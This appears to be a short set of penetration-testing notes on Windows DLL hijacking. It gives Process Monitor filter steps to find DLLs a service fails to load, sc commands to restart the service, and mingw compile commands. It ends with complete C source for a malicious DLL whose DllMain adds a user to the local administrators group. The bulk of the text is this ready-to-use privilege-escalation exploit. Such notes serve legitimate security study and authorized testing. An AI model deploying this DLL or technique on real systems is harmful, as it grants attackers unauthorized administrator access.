DLL Hijacking

  • Dynamic Link Library
  • Shared Library
  • Usually run with executable

  1. Run Process Monitor tool (procmon.exe)
  1. Find services that may be vulnerable…
  1. Filter → process name → is <found_service> → hit add
  1. Filter → by result → is NAME NOT FOUND → hit add
  1. hit apply
  1. Look for the missing dll when the service is started and replace it!

set path → ends with → dll

find writable folder or files

sc start dllsvc
sc stop dllsvc
sc start dllsvc
// x64: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// x86: i686-w64-mingw32-gcc windows_ddl.c -shared -o output.dll

#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
		if (dwReason == DLL_PROCESS_ATTACH) {
				system("cmd.exe /k net localgroup administrators user /add");
				ExitProcess(0);
		}
		return TRUE;
}
